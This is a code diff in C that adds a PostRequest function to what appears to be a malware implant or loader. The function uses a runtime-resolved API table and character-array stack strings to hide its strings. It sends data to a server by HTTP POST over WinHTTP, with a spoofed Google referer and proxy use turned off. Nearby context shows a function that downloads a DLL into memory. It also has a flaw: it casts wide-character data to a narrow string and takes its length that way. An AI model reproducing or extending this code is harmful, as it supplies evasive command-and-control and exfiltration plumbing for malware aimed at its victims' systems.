@@ -367,6 +367,66 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     return cpBuffer;
 }
 
+void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, const WCHAR* data) {
+    LPSTR pszData = (LPSTR)data;
+    BOOL bResults = FALSE;
+
+    WCHAR wVerb[] = {
+      'P', 'O', 'S', 'T', 0
+    };
+
+    WCHAR wUserAgent[] = {
+      'I', 'm', 'h', 'u', 'l', 'l', 'u', 0
+    };
+
+    WCHAR wVersion[] = {
+      'H', 'T', 'T', 'P', 0
+    };
+
+    WCHAR wReferer[] = {
+    'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0
+    };
+
+    WCHAR wProxy[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0};
+    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','B','Y','P','A','S','S',0};
+    WCHAR contentType[] = {'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n', 0};
+
+    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)(
+        wUserAgent,
+        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
+        wProxy,
+        wProxyBypass,
+        0
+    );
+
+    if (hSession) {
+        // Specify an HTTP server
+        HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(hSession, server, port, 0);
+
+        if (hConnect) {
+            // Create an HTTP request handle
+            #define WINHTTP_FLAG_REFRESH 0x00000100
+            HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)(hConnect, wVerb, endpoint, wVersion, wReferer, NULL, WINHTTP_FLAG_REFRESH);
+
+            if (hRequest) {
+                // Send the request
+                bResults = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)(hRequest,
+                                              contentType,
+                                              0,
+                                              (LPVOID)pszData,
+                                              myStrlenA(pszData),
+                                              myStrlenA(pszData),
+                                              0);
+
+                // Wait for the response
+                if (bResults) {
+                    bResults = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
+                }
+            }
+        }
+    }
+}
+
 LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     WCHAR wVerb[] = {
       'G', 'E', 'T', 0
